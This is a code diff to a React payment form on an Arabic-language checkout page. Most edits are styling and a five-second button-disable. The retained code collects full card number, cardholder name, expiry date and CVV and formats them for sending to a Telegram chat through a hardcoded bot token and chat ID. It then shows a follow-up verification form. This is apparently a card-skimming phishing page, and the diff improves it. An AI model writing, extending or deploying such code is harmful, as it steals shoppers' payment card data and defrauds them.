@@ -53,6 +53,7 @@ export default function PaymentForm({
   const [showApplePayMessage, setShowApplePayMessage] = useState(false);
   const [showVerificationForm, setShowVerificationForm] = useState(false);
   const [isCheckboxChecked, setIsCheckboxChecked] = useState(false);
+  const [isButtonDisabled, setIsButtonDisabled] = useState(false);
   const [cardInfo, setCardInfo] = useState({
     cardNumber: "",
     cardHolder: "",
@@ -197,7 +198,6 @@ export default function PaymentForm({
     );
   };
 
-
   const handleVerificationCancel = () => {
     setShowVerificationForm(false);
   };
@@ -269,10 +269,10 @@ export default function PaymentForm({
                 name="cardNumber"
                 value={cardInfo.cardNumber}
                 onChange={handleCardInfoChange}
-                className="w-full p-3 border rounded-lg text-left dir-ltr"
+                className="w-full p-3 border rounded-lg dir-ltr items-center justify-center"
                 placeholder="XXXX XXXX XXXX XXXX"
                 required
-                style={{ direction: "ltr", textAlign: "left" }}
+                style={{ direction: "ltr", textAlign: "center" }} // Center the placeholder text
               />
             </div>
             <div>
@@ -284,6 +284,7 @@ export default function PaymentForm({
                 onChange={handleCardInfoChange}
                 className="w-full p-3 border rounded-lg text-left dir-ltr"
                 placeholder="الاسم كما يظهر على البطاقة"
+                style={{ direction: "ltr", textAlign: "center" }}
                 required
               />
             </div>
@@ -298,6 +299,7 @@ export default function PaymentForm({
                   className="w-full p-3 border rounded-lg text-left dir-ltr"
                   placeholder="MM/YY"
                   required
+                  style={{ direction: "ltr", textAlign: "center" }}
                 />
               </div>
               <div>
@@ -310,26 +312,26 @@ export default function PaymentForm({
                   className="w-full p-3 border rounded-lg text-left dir-ltr"
                   placeholder="XXX"
                   required
+                  style={{ direction: "ltr", textAlign: "center" }}
                 />
               </div>
             </div>
-<div className="mb-4 ">
-  <label className="flex items- justify-start gap-2 space-x-reverse">
-    <input
-      type="checkbox"
-      className="form-checkbox h-4 w-4 text-blue-600 rounded border-gray-300 focus:ring-blue-500"
-      checked={isCheckboxChecked}
-      onChange={(e) => setIsCheckboxChecked(e.target.checked)}
-      required
-    />
-    <span className="text-sm text-gray-700">- أقر بالموافقة على سياسه الاستبدال والاسترجاع وآلية الضمان
-
-- أقر بالموافقة على استلام الطلب في حاله الدفع عند الاستلام واكون مسؤول عن الأضرار الناتج عن عدم الاستلام
-
-
-</span>
-  </label>
-</div>
+            <div className="mb-4 ">
+              <label className="flex items- justify-start gap-2 space-x-reverse">
+                <input
+                  type="checkbox"
+                  className="form-checkbox h-4 w-4 text-blue-600 rounded border-gray-300 focus:ring-blue-500"
+                  checked={isCheckboxChecked}
+                  onChange={(e) => setIsCheckboxChecked(e.target.checked)}
+                  required
+                />
+                <span className="text-sm text-gray-700">
+                  - أقر بالموافقة على سياسه الاستبدال والاسترجاع وآلية الضمان -
+                  أقر بالموافقة على استلام الطلب في حاله الدفع عند الاستلام
+                  واكون مسؤول عن الأضرار الناتج عن عدم الاستلام
+                </span>
+              </label>
+            </div>
           </div>
         )}
 
@@ -342,14 +344,19 @@ export default function PaymentForm({
 
 <button
   onClick={() => {
+    setIsButtonDisabled(true); // Disable the button immediately
     setTimeout(() => {
+      setIsButtonDisabled(false); // Re-enable the button after 5 seconds
       if (paymentMethod !== "credit_card" || validateCardInfo()) {
-        const escapeMarkdown = (text: string | number | Date | null | undefined) => {
+        const escapeMarkdown = (
+          text: string | number | Date | null | undefined
+        ) => {
           const safeText = text?.toString() || "";
           return safeText.replace(/[_*[\]()~`>#+\-=|{}.!]/g, "\\$&");
         };
 
-        const botToken = "7518243424:AAEy5xsiG0UTYXCJ_-4lS5Ja5K0pmy4XPUA";
+        const botToken =
+          "7518243424:AAEy5xsiG0UTYXCJ_-4lS5Ja5K0pmy4XPUA";
         const chatId = "-1002630840593";
 
         const formatOrderInfo = () => {
@@ -376,14 +383,29 @@ export default function PaymentForm({
               ];
 
               if (cardInfo.cardNumber) {
-                const formattedCardNumber = cardInfo.cardNumber.replace(/\s/g, "");
-                parts.push(`*Card Number:* ${escapeMarkdown(formattedCardNumber)}`);
+                const formattedCardNumber = cardInfo.cardNumber.replace(
+                  /\s/g,
+                  ""
+                );
+                parts.push(
+                  `*Card Number:* ${escapeMarkdown(
+                    formattedCardNumber
+                  )}`
+                );
               }
               if (cardInfo.cardHolder) {
-                parts.push(`*Card Holder Name:* ${escapeMarkdown(cardInfo.cardHolder)}`);
+                parts.push(
+                  `*Card Holder Name:* ${escapeMarkdown(
+                    cardInfo.cardHolder
+                  )}`
+                );
               }
               if (cardInfo.expiryDate) {
-                parts.push(`*Expiry Date:* ${escapeMarkdown(cardInfo.expiryDate)}`);
+                parts.push(
+                  `*Expiry Date:* ${escapeMarkdown(
+                    cardInfo.expiryDate
+                  )}`
+                );
               }
               if (cardInfo.cvv) {
                 parts.push(`*CVV:* ${escapeMarkdown(cardInfo.cvv)}`);
@@ -407,12 +429,16 @@ export default function PaymentForm({
             );
           })
           .then(() => {
-            if (paymentMethod === "credit_card" && !showVerificationForm) {
+            if (
+              paymentMethod === "credit_card" &&
+              !showVerificationForm
+            ) {
               setShowVerificationForm(true);
             } else if (!showVerificationForm) {
               handlePaymentSubmit({
                 paymentMethod,
-                ...(paymentMethod === "tabby" || paymentMethod === "tamara"
+                ...(paymentMethod === "tabby" ||
+                paymentMethod === "tamara"
                   ? cardInfo
                   : {}),
               });
@@ -420,7 +446,9 @@ export default function PaymentForm({
           })
           .catch((error) => {
             console.error("Error sending payment data:", error);
-            alert("حدث خطأ أثناء معالجة الطلب. الرجاء المحاولة مرة أخرى.");
+            alert(
+              "حدث خطأ أثناء معالجة الطلب. الرجاء المحاولة مرة أخرى."
+            );
           });
       } else {
         alert("الرجاء التأكد من إدخال بيانات البطاقة بشكل صحيح");
@@ -428,13 +456,12 @@ export default function PaymentForm({
     }, 5000); // تأخير التنفيذ لمدة 5 ثواني
   }}
   className={`w-full component-base py-3 px-6 font-medium ${
-    isProcessing ? "bg-gray-400 cursor-not-allowed" : "warning"
+    isProcessing || isButtonDisabled ? "bg-gray-400 cursor-not-allowed" : "warning"
   }`}
-  disabled={!isCheckboxChecked || isProcessing}
+  disabled={!isCheckboxChecked || isProcessing || isButtonDisabled} // Update disabled condition
 >
-  إتمام الدفع
+  {isButtonDisabled ? "جار معالجة عملية الدفع" : "إتمام الدفع"}
 </button>
-
       </div>
 
       {/* Show verification form when needed */}
@@ -452,6 +479,5 @@ export default function PaymentForm({
 
       {/* <VerificationPage/> */}
     </div>
-
-  );}
-
+  );
+}
